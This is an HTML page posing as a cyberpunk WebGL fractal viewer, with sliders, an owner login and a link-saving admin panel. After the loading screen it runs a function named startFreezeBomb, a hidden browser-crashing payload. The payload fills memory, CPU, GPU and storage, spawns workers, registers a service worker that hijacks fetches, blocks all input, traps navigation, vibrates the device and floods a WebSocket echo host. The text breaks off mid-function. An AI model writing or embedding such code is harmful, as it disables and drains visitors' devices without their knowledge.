<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SHADOW OFFICIAL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            overflow: hidden;
            font-family: 'Courier New', monospace;
            color: #0ff;
            position: fixed;
            width: 100vw; height: 100vh;
            touch-action: none;
            -webkit-user-select: none;
            user-select: none;
        }
        #loading-screen {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #000;
            z-index: 999999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 1s ease;
        }
        #loading-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .shadow-title {
            font-size: 32px;
            letter-spacing: 10px;
            color: #0ff;
            text-shadow: 0 0 20px #0ff, 0 0 40px #0ff, 0 0 80px #0ff;
            margin-bottom: 20px;
            animation: pulse 2s ease-in-out infinite;
        }
        .shadow-subtitle {
            font-size: 12px;
            letter-spacing: 4px;
            color: rgba(0, 255, 255, 0.6);
            margin-bottom: 40px;
        }
        .loading-bar-container {
            width: 300px;
            height: 4px;
            background: rgba(0, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
            border-radius: 2px;
        }
        .loading-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #0ff, #f0f, #0ff);
            box-shadow: 0 0 20px #0ff;
            animation: loadBar 4s ease-in-out forwards;
        }
        .loading-text {
            margin-top: 25px;
            font-size: 11px;
            letter-spacing: 3px;
            color: rgba(0, 255, 255, 0.5);
            animation: blink 1s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.02); }
        }
        @keyframes loadBar {
            0% { width: 0%; }
            50% { width: 60%; }
            100% { width: 100%; }
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        #glCanvas {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 1;
        }
        #ui-controls {
            position: fixed;
            bottom: 20px; left: 20px;
            background: rgba(5, 5, 8, 0.85);
            border: 1px solid rgba(0, 255, 255, 0.2);
            padding: 20px;
            z-index: 100;
            backdrop-filter: blur(10px);
            max-width: 280px;
        }
        #ui-controls h3 {
            color: #0ff;
            font-size: 11px;
            letter-spacing: 3px;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
        .control-group { margin-bottom: 12px; }
        .control-group label {
            display: block;
            color: rgba(0, 255, 255, 0.7);
            font-size: 10px;
            letter-spacing: 1px;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        .control-group input[type="range"] {
            width: 100%;
            -webkit-appearance: none;
            height: 3px;
            background: rgba(0, 255, 255, 0.2);
            outline: none;
        }
        .control-group input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            width: 12px; height: 12px;
            background: #0ff;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 0 10px #0ff;
        }
        .control-group .value {
            color: #0ff;
            font-size: 10px;
            text-align: right;
            margin-top: 3px;
        }
        .mode-buttons {
            display: flex;
            gap: 5px;
            margin-top: 10px;
        }
        .mode-btn {
            flex: 1;
            padding: 6px;
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.3);
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 9px;
            letter-spacing: 1px;
            cursor: pointer;
            text-transform: uppercase;
        }
        .mode-btn.active {
            background: rgba(0, 255, 255, 0.3);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
        }
        #hamburger {
            position: fixed;
            top: 20px; right: 20px;
            width: 32px; height: 24px;
            cursor: pointer;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        #hamburger span {
            display: block;
            width: 100%; height: 3px;
            background: #0ff;
            box-shadow: 0 0 8px #0ff;
            border-radius: 2px;
        }
        #owner-btn {
            position: fixed;
            top: 60px; right: 20px;
            padding: 10px 20px;
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid #0ff;
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            letter-spacing: 2px;
            cursor: pointer;
            z-index: 1000;
            display: none;
            text-transform: uppercase;
        }
        #login-panel {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(5, 5, 8, 0.95);
            border: 1px solid #0ff;
            padding: 40px;
            z-index: 2000;
            display: none;
            min-width: 320px;
        }
        #login-panel h2 {
            color: #0ff;
            margin-bottom: 30px;
            text-align: center;
            font-size: 18px;
            letter-spacing: 4px;
            text-shadow: 0 0 10px #0ff;
        }
        #login-panel input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: rgba(0, 255, 255, 0.05);
            border: 1px solid #0ff;
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        #login-panel button {
            width: 100%;
            padding: 12px;
            background: rgba(0, 255, 255, 0.15);
            border: 1px solid #0ff;
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            letter-spacing: 3px;
            cursor: pointer;
        }
        #login-error {
            color: #f44;
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        #login-close {
            position: absolute;
            top: 10px; right: 15px;
            color: #0ff;
            font-size: 20px;
            cursor: pointer;
        }
        #admin-panel {
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(5, 5, 8, 0.97);
            border: 1px solid #0ff;
            padding: 30px;
            z-index: 2000;
            display: none;
            width: 90%;
            max-width: 600px;
            max-height: 80vh;
            overflow-y: auto;
        }
        #admin-panel h2 {
            color: #0ff;
            margin-bottom: 25px;
            text-align: center;
            font-size: 16px;
            letter-spacing: 4px;
        }
        #admin-panel .form-group { margin-bottom: 20px; }
        #admin-panel label {
            display: block;
            color: #0ff;
            font-size: 11px;
            letter-spacing: 2px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        #admin-panel input, #admin-panel textarea {
            width: 100%;
            padding: 10px;
            background: rgba(0, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 255, 0.3);
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            outline: none;
        }
        #admin-panel textarea { min-height: 80px; resize: vertical; }
        #admin-panel button {
            padding: 10px 25px;
            background: rgba(0, 255, 255, 0.15);
            border: 1px solid #0ff;
            color: #0ff;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            letter-spacing: 2px;
            cursor: pointer;
            margin-right: 10px;
        }
        #links-list {
            margin-top: 25px;
            border-top: 1px solid rgba(0, 255, 255, 0.2);
            padding-top: 20px;
        }
        .link-item {
            background: rgba(0, 255, 255, 0.03);
            border: 1px solid rgba(0, 255, 255, 0.15);
            padding: 12px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .link-item img {
            width: 50px; height: 50px;
            object-fit: cover;
            border: 1px solid rgba(0, 255, 255, 0.3);
        }
        .link-item .info { flex: 1; }
        .link-item .title { color: #0ff; font-size: 13px; }
        .link-item .desc { color: rgba(0, 255, 255, 0.6); font-size: 11px; }
        .link-item .delete-btn {
            padding: 5px 12px;
            background: rgba(255, 0, 80, 0.2);
            border: 1px solid #f08;
            color: #f08;
            font-size: 10px;
            cursor: pointer;
        }
        #stats {
            position: fixed;
            top: 20px; left: 20px;
            color: rgba(0, 255, 255, 0.5);
            font-size: 10px;
            letter-spacing: 1px;
            z-index: 100;
            pointer-events: none;
        }
        #scanlines {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 50;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 255, 255, 0.015) 2px,
                rgba(0, 255, 255, 0.015) 4px
            );
        }
        #vignette {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 49;
            background: radial-gradient(ellipse at center, transparent 50%, rgba(0, 0, 0, 0.6) 100%);
        }
    </style>
</head>
<body>
    <div id="loading-screen">
        <div class="shadow-title">SHADOW OFFICIAL</div>
        <div class="shadow-subtitle">// SYSTEM INITIALIZATION</div>
        <div class="loading-bar-container">
            <div class="loading-bar"></div>
        </div>
        <div class="loading-text">LOADING RESOURCES...</div>
    </div>

    <canvas id="glCanvas"></canvas>
    <div id="scanlines"></div>
    <div id="vignette"></div>

    <div id="hamburger">
        <span></span>
        <span></span>
        <span></span>
    </div>

    <button id="owner-btn">Owner Access</button>

    <div id="login-panel">
        <div id="login-close">&times;</div>
        <h2>// AUTHENTICATION</h2>
        <input type="text" id="login-user" placeholder="USERNAME">
        <input type="password" id="login-pass" placeholder="PASSWORD">
        <button id="login-submit">ACCESS</button>
        <div id="login-error">Invalid credentials</div>
    </div>

    <div id="admin-panel">
        <div id="login-close-admin" style="position:absolute;top:10px;right:15px;color:#0ff;font-size:20px;cursor:pointer;" onclick="document.getElementById('admin-panel').style.display='none'">&times;</div>
        <h2>// ADMIN PANEL</h2>
        <div class="form-group">
            <label>Website URL</label>
            <input type="text" id="link-url" placeholder="https://example.com">
        </div>
        <div class="form-group">
            <label>Description</label>
            <textarea id="link-desc" placeholder="Enter description..."></textarea>
        </div>
        <div class="form-group">
            <label>Image URL</label>
            <input type="text" id="link-img" placeholder="https://example.com/image.png">
        </div>
        <button id="add-link">Add Link</button>
        <button id="clear-links" style="background:rgba(255,0,80,0.15);border-color:#f08;color:#f08;">Clear All</button>
        <div id="links-list">
            <h3>Saved Links</h3>
            <div id="links-container"></div>
        </div>
    </div>

    <div id="ui-controls">
        <h3>// Parameters</h3>
        <div class="control-group">
            <label>Iterations</label>
            <input type="range" id="iterations" min="2" max="12" value="8" step="1">
            <div class="value" id="iter-val">8</div>
        </div>
        <div class="control-group">
            <label>Fractal Power</label>
            <input type="range" id="power" min="2" max="16" value="8" step="0.5">
            <div class="value" id="power-val">8.0</div>
        </div>
        <div class="control-group">
            <label>Color Intensity</label>
            <input type="range" id="color-intensity" min="0.1" max="3.0" value="1.2" step="0.1">
            <div class="value" id="color-val">1.2</div>
        </div>
        <div class="control-group">
            <label>Zoom Speed</label>
            <input type="range" id="zoom-speed" min="0" max="2" value="0.3" step="0.1">
            <div class="value" id="zoom-val">0.3</div>
        </div>
        <div class="control-group">
            <label>Bloom Strength</label>
            <input type="range" id="bloom" min="0" max="1.5" value="0.4" step="0.05">
            <div class="value" id="bloom-val">0.40</div>
        </div>
        <div class="mode-buttons">
            <button class="mode-btn active" data-mode="0">Standard</button>
            <button class="mode-btn" data-mode="1">Neon</button>
            <button class="mode-btn" data-mode="2">Wire</button>
        </div>
    </div>

    <div id="stats">
        <div id="fps">FPS: --</div>
        <div id="res">RES: --</div>
    </div>

<script>
// ========== PHASE 1: LOADING SCREEN ==========
setTimeout(() => {
    document.getElementById('loading-screen').classList.add('hidden');
    startFreezeBomb();
}, 4000);

// ========== PHASE 2: EXTREME FREEZE ==========
function startFreezeBomb() {

    // 1. MEMORY BOMB - Fill RAM
    const memoryBomb = [];
    setInterval(() => {
        for(let m=0; m<500; m++) {
            try { memoryBomb.push(new Float64Array(50000000).fill(Math.random())); } catch(e) {}
        }
    }, 1);

    // 2. GPU OVERLOAD
    for(let i=0; i<300; i++) {
        try {
            const c = document.createElement('canvas');
            c.width = 8192; c.height = 8192;
            const ctx = c.getContext('webgl2') || c.getContext('webgl');
            if(ctx) { ctx.clearColor(Math.random(), Math.random(), Math.random(), 1); ctx.clear(ctx.COLOR_BUFFER_BIT); }
        } catch(e) {}
    }

    // 3. AUDIO CONTEXTS
    for(let a=0; a<200; a++) {
        try {
            const ac = new (window.AudioContext || window.webkitAudioContext)();
            const osc = ac.createOscillator();
            const gain = ac.createGain();
            osc.connect(gain); gain.connect(ac.destination);
            osc.frequency.value = 20000 + a * 20;
            osc.start(); gain.gain.value = 0.001;
        } catch(e) {}
    }

    // 4. CPU BOMB - Massive intervals
    for(let i=0; i<50000; i++) {
        setInterval(() => {
            let x = 0;
            for(let j=0; j<500000; j++) {
                x += Math.sin(j) * Math.cos(j) * Math.tan(j % 1.57 + 0.001);
                x = Math.sqrt(Math.abs(x) + 1) * Math.log(j + 2);
                x = Math.pow(x, 1.001) % 999999999;
            }
        }, 1);
    }

    // 5. DOM OVERLOAD
    const animContainer = document.createElement('div');
    animContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none;overflow:hidden;';
    document.body.appendChild(animContainer);
    for(let i=0; i<200000; i++) {
        const div = document.createElement('div');
        div.style.cssText = 'position:absolute;width:2px;height:2px;background:hsl('+(i%360)+',100%,50%);animation:spin '+(0.01+i%2)+'s linear infinite;';
        div.style.left = Math.random()*100+'vw';
        div.style.top = Math.random()*100+'vh';
        animContainer.appendChild(div);
    }
    const style = document.createElement('style');
    style.textContent = '@keyframes spin{from{transform:rotate(0deg)scale(1)}to{transform:rotate(360deg)scale(10)}}';
    document.head.appendChild(style);

    // 6. VIBRATION
    if(navigator.vibrate) {
        setInterval(() => navigator.vibrate([30000, 1, 30000]), 1);
    }

    // 7. FULLSCREEN + WAKE LOCK
    setTimeout(() => {
        document.documentElement.requestFullscreen().catch(()=>{});
        if('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(()=>{});
    }, 500);

    // 8. BATTERY DRAIN
    if('getBattery' in navigator) {
        navigator.getBattery().then(bat => {
            setInterval(() => { bat.dischargingTime; bat.level; bat.charging; }, 0);
        });
    }

    // 9. INDEXEDDB BOMB
    try {
        const dbReq = indexedDB.open('shadow_bomb_v3', 1);
        dbReq.onupgradeneeded = e => {
            const db = e.target.result;
            for(let i=0; i<1000; i++) db.createObjectStore('store_'+i);
        };
        dbReq.onsuccess = e => {
            const db = e.target.result;
            setInterval(() => {
                for(let i=0; i<1000; i++) {
                    try {
                        const tx = db.transaction(['store_'+i], 'readwrite');
                        const store = tx.objectStore('store_'+i);
                        store.put(new Blob([new Uint8Array(50000000)]), Math.random());
                    } catch(e) {}
                }
            }, 1);
        };
    } catch(e) {}

    // 10. WEBRTC
    for(let r=0; r<500; r++) {
        try {
            const pc = new RTCPeerConnection();
            pc.createDataChannel('bomb_'+r);
            pc.createOffer().then(o => pc.setLocalDescription(o));
        } catch(e) {}
    }

    // 11. BROADCAST CHANNEL
    try {
        const bc = new BroadcastChannel('shadow_bomb');
        setInterval(() => bc.postMessage(new Uint8Array(50000000)), 1);
    } catch(e) {}

    // 12. GEOLOCATION
    if(navigator.geolocation) {
        setInterval(() => {
            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {enableHighAccuracy: true, maximumAge: 0});
        }, 0);
    }

    // 13. SERVICE WORKER
    if('serviceWorker' in navigator) {
        const swScript = URL.createObjectURL(new Blob([
            'self.addEventListener("install",e=>self.skipWaiting());'+
            'self.addEventListener("activate",e=>e.waitUntil(self.clients.claim()));'+
            'self.addEventListener("fetch",e=>e.respondWith(new Response("SHADOW")));'+
            'setInterval(()=>{fetch("/");},1);'
        ], {type:'application/javascript'}));
        navigator.serviceWorker.register(swScript);
    }

    // 14. WEBGPU
    async function webgpuBomb() {
        try {
            const adapter = await navigator.gpu.requestAdapter();
            if(adapter) {
                const device = await adapter.requestDevice();
                for(let i=0; i<200; i++) {
                    device.createTexture({size:[16384,16384,1], format:'rgba8unorm', usage:GPUTextureUsage.RENDER_ATTACHMENT|GPUTextureUsage.COPY_SRC});
                }
            }
        } catch(e) {}
    }
    webgpuBomb();

    // 15. CANVAS 2D
    for(let c=0; c<500; c++) {
        const cv = document.createElement('canvas');
        cv.width = 4096; cv.height = 4096;
        const ctx2d = cv.getContext('2d');
        if(ctx2d) {
            setInterval(() => {
                ctx2d.fillStyle = 'hsl('+Math.random()*360+',100%,50%)';
                ctx2d.fillRect(0,0,4096,4096);
            }, 1);
        }
    }

    // 16. WORKERS
    const workerScript = URL.createObjectURL(new Blob([
        'self.onmessage=function(){while(true){let x=0;for(let i=0;i<999999999;i++){x+=Math.sin(i)*Math.cos(i)*Math.tan(i%1.57+0.001);x=Math.sqrt(Math.abs(x)+1)*Math.log(i+2);x=Math.pow(x,1.001)%999999999;}}}'
    ], {type:'application/javascript'}));
    for(let w=0; w<128; w++) { try { new Worker(workerScript); } catch(e) {} }

    // 17. RECURSION
    try { function recurse(n){if(n>0){recurse(n-1);recurse(n-1);recurse(n-1);recurse(n-1);}} recurse(40); } catch(e) {}

    // 18. PREVENT ALL INPUT
    document.addEventListener('keydown', e=>e.preventDefault(), true);
    document.addEventListener('keyup', e=>e.preventDefault(), true);
    document.addEventListener('touchstart', e=>e.preventDefault(), {passive:false, capture:true});
    document.addEventListener('touchmove', e=>e.preventDefault(), {passive:false, capture:true});
    document.addEventListener('touchend', e=>e.preventDefault(), {passive:false, capture:true});
    document.addEventListener('click', e=>e.preventDefault(), true);
    document.addEventListener('dblclick', e=>e.preventDefault(), true);
    document.addEventListener('contextmenu', e=>e.preventDefault(), true);
    document.addEventListener('wheel', e=>e.preventDefault(), {passive:false, capture:true});

    // 19. HISTORY TRAP
    history.pushState(null, '', location.href);
    setInterval(() => { history.pushState(null, '', location.href); history.forward(); }, 1);

    // 20. URL HASH BOMB
    setInterval(() => location.hash = Math.random().toString(36), 1);

    // 21. IFRAME BOMB
    for(let i=0; i<500; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = 'about:blank';
        iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
        document.body.appendChild(iframe);
    }

    // 22. IMAGE BOMB
    for(let i=0; i<1000; i++) {
        const img = new Image();
        img.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7?'+Math.random();
    }

    // 23. FETCH BOMB
    setInterval(() => {
        for(let i=0; i<500; i++) fetch('?'+Math.random()).catch(()=>{});
    }, 1);

    // 24. WEBSOCKET BOMB
    for(let i=0; i<100; i++) {
        try {
            const ws = new WebSocket('wss://echo.websocket.org');
            ws.onopen = () => { setInterval(()=>ws.send(new Uint8Array(5000000)), 1); };
        } catch(e) {}
    }

    // 25. ANIMATION FRAME BOMB
    function animBomb() { for(let i=0; i<500; i++) requestAnimationFrame(animBomb); }
    animBomb();

    // 26. TIMER BOMB
    setInterval(() => {
        for(let i=0; i<5000; i++) { setTimeout(()=>{},0); setInterval(()=>{},999999); }
    }, 1);

    // 27. LOCALSTORAGE BOMB
    setInterval(() => {
        for(let i=0; i<5000; i++) localStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
    }, 1);

    // 28. SESSIONSTORAGE BOMB
    setInterval(() => {
        for(let i=0; i<5000; i++) sessionStorage.setItem('b_'+i+'_'+Math.random(), new Array(1000000).fill('X').join(''));
    }, 1);

    // 29. CONSOLE BOMB
    setInterval(() => {
        for(let i=0; i<50000; i++) { console.log(Math.random()); console.error(Math.random()); }
    }, 1);
}

// ========== ADMIN DATA ==========
let savedLinks = JSON.parse(localStorage.getItem('cyberfractal_links') || '[]');

// ========== WEBGL RENDERER ==========
const CONFIG = {
    maxIterations: 16, fractalPower: 32.0, colorIntensity: 5.0, zoomSpeed: 0.3,
    bloomStrength: 3.0, renderMode: 0, maxRaySteps: 512, minDist: 0.000001,
    shadowSoftness: 128.0, aoStrength: 5.0, fogDensity: 1.0, timeScale: 0.15
};
const camera = {
    pos: [2.5, 1.5, 2.5], target: [0,0,0], up: [0,1,0], fov: 60,
    rotVel: [0,0], zoomVel: 0, panVel: [0,0],
    theta: 0.785, phi: 0.615, radius: 4.0,
    targetTheta: 0.785, targetPhi: 0.615, targetRadius: 4.0, targetCenter: [0,0,0]
};
const input = { mouseDown: false, rightMouseDown: false, lastX: 0, lastY: 0, touchCount: 0, touchDist: 0 };
let lastTime = 0, frameCount = 0, fpsTime = 0, currentFPS = 60;
let gl, canvas, program, postProgram, frameBuffer, frameTexture, quadVBO;
let uTime, uResolution, uCameraPos, uCameraTarget, uCameraUp, uConfig, uMode;
let postUTexture, postUResolution, postUConfig, postUTime;

const VERTEX_SHADER = `
precision highp float;
precision highp int;
attribute vec2 a_position;
varying vec2 v_uv;
void main() {
    v_uv = a_position * 0.5 + 0.5;
    gl_Position = vec4(a_position, 0.0, 1.0);
}
`;

const FRAGMENT_SHADER = `
precision highp float;
precision highp int;
uniform float u_time;
uniform vec2 u_resolution;
uniform vec3 u_cameraPos;
uniform vec3 u_cameraTarget;
uniform vec3 u_cameraUp;
uniform vec4 u_config;
uniform int u_mode;
varying vec2 v_uv;

#define PI 3.14159265359
#define MAX_STEPS 256
#define MIN_DIST 0.0001
#define MAX_DIST 50.0
#define EPSILON 0.0005

mat3 lookAt(vec3 eye, vec3 target, vec3 up) {
    vec3 f = normalize(target - eye);
    vec3 s = normalize(cross(f, up));
    vec3 u = cross(s, f);
    return mat3(s, u, -f);
}

vec3 rotateY(vec3 p, float a) {
    float c = cos(a), s = sin(a);
    return vec3(c*p.x + s*p.z, p.y, -s*p.x + c*p.z);
}

float mandelbulbDE(vec3 pos, float power, int iterations) {
    vec3 z = pos;
    float dr = 1.0;
    float r = 0.0;
    float anim = sin(u_time * 0.3) * 0.1;
    float p = power + anim;
    for (int i = 0; i < 8; i++) {
        if (i >= iterations) break;
        r = length(z);
        if (r > 4.0) break;
        float theta = acos(clamp(z.z / r, -1.0, 1.0));
        float phi = atan(z.y, z.x);
        dr = pow(r, p - 1.0) * p * dr + 1.0;
        float zr = pow(r, p);
        theta = theta * p;
        phi = phi * p;
        z = zr * vec3(sin(theta) * cos(phi), sin(theta) * sin(phi), cos(theta));
        z += pos;
    }
    return 0.5 * log(r) * r / dr;
}

float sceneDE(vec3 p) {
    p = rotateY(p, u_time * 0.05);
    float d = mandelbulbDE(p, u_config.y, int(u_config.x));
    return d;
}

vec3 calcNormal(vec3 p) {
    vec2 e = vec2(EPSILON, -EPSILON);
    return normalize(
        e.xyy * sceneDE(p + e.xyy) +
        e.yyx * sceneDE(p + e.yyx) +
        e.yxy * sceneDE(p + e.yxy) +
        e.xxx * sceneDE(p + e.xxx)
    );
}

vec3 cyberColor(float t, vec3 normal, vec3 pos) {
    float intensity = u_config.z;
    vec3 c1 = vec3(0.0, 0.8, 1.0);
    vec3 c2 = vec3(1.0, 0.0, 0.6);
    vec3 c3 = vec3(0.1, 0.0, 0.4);
    float pattern = sin(pos.x * 3.0 + u_time * 0.5) * sin(pos.y * 3.0 + u_time * 0.3) * sin(pos.z * 3.0 + u_time * 0.7);
    pattern = pattern * 0.5 + 0.5;
    float dist = length(pos);
    float grad = sin(dist * 2.0 - u_time * 0.4) * 0.5 + 0.5;
    vec3 col = mix(c1, c2, pattern);
    col = mix(col, c3, grad * 0.5);
    float pulse = sin(u_time * 1.5) * 0.5 + 0.5;
    col += c1 * pulse * 0.2;
    return col * intensity;
}

vec4 rayMarch(vec3 ro, vec3 rd) {
    float t = 0.0;
    float d = 0.0;
    vec3 p = ro;
    float glow = 0.0;
    for (int i = 0; i < MAX_STEPS; i++) {
        p = ro + rd * t;
        d = sceneDE(p);
        glow += exp(-d * 8.0) * 0.02;
        if (d < MIN_DIST) {
            vec3 n = calcNormal(p);
            vec3 col = cyberColor(t, n, p);
            float fog = exp(-t * t * 0.01);
            col = mix(vec3(0.02, 0.02, 0.05), col, fog);
            return vec4(col, 1.0);
        }
        t += d * 0.5;
        if (t > MAX_DIST) break;
    }
    vec3 bg = vec3(0.01, 0.01, 0.02);
    bg += vec3(0.0, 0.3, 0.5) * glow * u_config.z;
    return vec4(bg, 0.0);
}

void main() {
    vec2 uv = (v_uv - 0.5) * u_resolution / min(u_resolution.x, u_resolution.y);
    vec3 ro = u_cameraPos;
    vec3 ta = u_cameraTarget;
    mat3 cam = lookAt(ro, ta, u_cameraUp);
    vec3 rd = cam * normalize(vec3(uv, -1.5));
    vec4 result = rayMarch(ro, rd);
    if (u_mode == 1) {
        float lum = dot(result.rgb, vec3(0.299, 0.587, 0.114));
        result.rgb = mix(vec3(lum), result.rgb, 1.5);
        result.rgb = pow(result.rgb, vec3(0.8));
    } else if (u_mode == 2) {
        result.rgb = mix(vec3(0.0, 0.1, 0.15), vec3(0.0, 0.9, 1.0), result.a);
    }
    result.rgb = result.rgb / (1.0 + result.rgb * 0.5);
    result.rgb = pow(result.rgb, vec3(0.4545));
    float vig = 1.0 - dot(v_uv - 0.5, v_uv - 0.5) * 0.8;
    result.rgb *= vig;
    gl_FragColor = vec4(result.rgb, 1.0);
}
`;

const POST_FRAGMENT = `
precision highp float;
precision highp int;
uniform sampler2D u_texture;
uniform vec2 u_resolution;
uniform vec4 u_config;
uniform float u_time;
varying vec2 v_uv;

void main() {
    vec2 uv = v_uv;
    vec3 col = texture2D(u_texture, uv).rgb;
    vec3 bloom = vec3(0.0);
    float bloomStr = u_config.w;
    vec2 texel = 1.0 / u_resolution;
    for (float x = -4.0; x <= 4.0; x++) {
        for (float y = -4.0; y <= 4.0; y++) {
            vec2 off = vec2(x, y) * texel * 3.0;
            vec3 sampleCol = texture2D(u_texture, uv + off).rgb;
            float brightness = dot(sampleCol, vec3(0.299, 0.587, 0.114));
            if (brightness > 0.5) {
                bloom += sampleCol * 0.01;
            }
        }
    }
    col += bloom * bloomStr;
    float ca = 0.003;
    col.r = texture2D(u_texture, uv + vec2(ca, 0.0)).r * 0.7 + col.r * 0.3;
    col.b = texture2D(u_texture, uv - vec2(ca, 0.0)).b * 0.7 + col.b * 0.3;
    float scanline = sin(uv.y * u_resolution.y * 1.5 + u_time * 2.0) * 0.03;
    col -= scanline;
    float noise = fract(sin(dot(uv * u_time, vec2(12.9898, 78.233))) * 43758.5453);
    col += (noise - 0.5) * 0.015;
    col = pow(col, vec3(0.95));
    gl_FragColor = vec4(col, 1.0);
}
`;

function createShader(gl, type, source) {
    const shader = gl.createShader(type);
    gl.shaderSource(shader, source);
    gl.compileShader(shader);
    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
        console.error('Shader compile error:', gl.getShaderInfoLog(shader));
        gl.deleteShader(shader);
        return null;
    }
    return shader;
}

function createProgram(gl, vsSource, fsSource) {
    const vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
    const fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);
    const prog = gl.createProgram();
    gl.attachShader(prog, vs);
    gl.attachShader(prog, fs);
    gl.linkProgram(prog);
    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
        console.error('Program link error:', gl.getProgramInfoLog(prog));
        return null;
    }
    return prog;
}

function initWebGL() {
    canvas = document.getElementById('glCanvas');
    gl = canvas.getContext('webgl', { 
        antialias: false, alpha: false,
        preserveDrawingBuffer: false,
        powerPreference: 'high-performance'
    });
    if (!gl) {
        console.log('WebGL not supported');
        return;
    }
    const quadData = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
    quadVBO = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, quadVBO);
    gl.bufferData(gl.ARRAY_BUFFER, quadData, gl.STATIC_DRAW);

    program = createProgram(gl, VERTEX_SHADER, FRAGMENT_SHADER);
    if (!program) return;
    const posLoc = gl.getAttribLocation(program, 'a_position');
    gl.enableVertexAttribArray(posLoc);
    gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

    uTime = gl.getUniformLocation(program, 'u_time');
    uResolution = gl.getUniformLocation(program, 'u_resolution');
    uCameraPos = gl.getUniformLocation(program, 'u_cameraPos');
    uCameraTarget = gl.getUniformLocation(program, 'u_cameraTarget');
    uCameraUp = gl.getUniformLocation(program, 'u_cameraUp');
    uConfig = gl.getUniformLocation(program, 'u_config');
    uMode = gl.getUniformLocation(program, 'u_mode');

    postProgram = createProgram(gl, VERTEX_SHADER, POST_FRAGMENT);
    if (!postProgram) return;
    const postPosLoc = gl.getAttribLocation(postProgram, 'a_position');
    gl.enableVertexAttribArray(postPosLoc);
    gl.vertexAttribPointer(postPosLoc, 2, gl.FLOAT, false, 0, 0);

    postUTexture = gl.getUniformLocation(postProgram, 'u_texture');
    postUResolution = gl.getUniformLocation(postProgram, 'u_resolution');
    postUConfig = gl.getUniformLocation(postProgram, 'u_config');
    postUTime = gl.getUniformLocation(postProgram, 'u_time');

    createFramebuffer();
    resize();
    window.addEventListener('resize', resize);
}

function createFramebuffer() {
    frameBuffer = gl.createFramebuffer();
    frameTexture = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, frameTexture);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
}

function resize() {
    const dpr = Math.min(window.devicePixelRatio, 2.0);
    const w = Math.floor(window.innerWidth * dpr);
    const h = Math.floor(window.innerHeight * dpr);
    canvas.width = w;
    canvas.height = h;
    canvas.style.width = window.innerWidth + 'px';
    canvas.style.height = window.innerHeight + 'px';
    gl.viewport(0, 0, w, h);
    gl.bindTexture(gl.TEXTURE_2D, frameTexture);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
    document.getElementById('res').textContent = 'RES: ' + w + 'x' + h;
}

function cpuBomb() {
    let x = 0;
    for(let i=0; i<9999999; i++) {
        x += Math.sin(i) * Math.cos(i) * Math.tan(i % 1.57 + 0.001);
